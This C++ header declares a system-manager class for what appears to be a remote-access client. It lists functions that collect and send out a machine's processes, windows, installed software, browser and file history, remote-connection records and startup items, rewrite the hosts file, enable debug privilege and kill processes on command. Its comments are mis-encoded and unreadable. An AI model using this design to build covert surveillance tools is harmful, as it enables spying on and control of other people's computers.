#pragma once
#include "../../PublicInclude/Manager.h"

class CSystemManager : public CManager
{
public:

	CSystemManager(CClientSocket* pClient);
	virtual ~CSystemManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static bool DebugPrivilege(const char* PName, BOOL bEnable);
	static bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);

private:
	//ͨ����ݷ�ʽ��ȡ����·��
	BOOL FindLnkPath(char* lnk, char* bug, DWORD SIZE);

	//------------------------------------------------------��Ϣ��ȡ�뷢��---------------------------
	LPBYTE getProcessList();							//���̷��ͺͻ�ȡ				
	void SendProcessList();

	LPBYTE GeHistoryFileList();							//�ļ�������ʷ	
	void SendHistoryFileList();

	LPBYTE getWindowsList();							//��ȡ���ͺͻ�ȡ							
	void SendWindowsList();						

	void SendHostsFileInfo();							//host�ļ����ͺͱ���
	void SaveHostsFileInfo(LPBYTE lpBuffer, UINT nSize);

	LPBYTE getSoftWareList();							//��װ��Ϣ��ȡ�뷢��
	void SendSoftWareList();

	LPBYTE getIEHistoryList();						//��ʷ��¼��ȡ�뷢��
	void SendIEHistoryList();

	LPBYTE GetRemoteList();					//��ȡԶ�����Ӽ�¼
	void SendRemoteList();

	void SendStartupList();					//������
	LPBYTE getStartupList();

	void SendNetStateList();			//����״̬

	void KillProcess(LPBYTE lpBuffer, UINT nSize, BOOL Flag);

protected:
	
	void TestWindow(LPBYTE buf);
	void CloseWindow(LPBYTE buf);
};
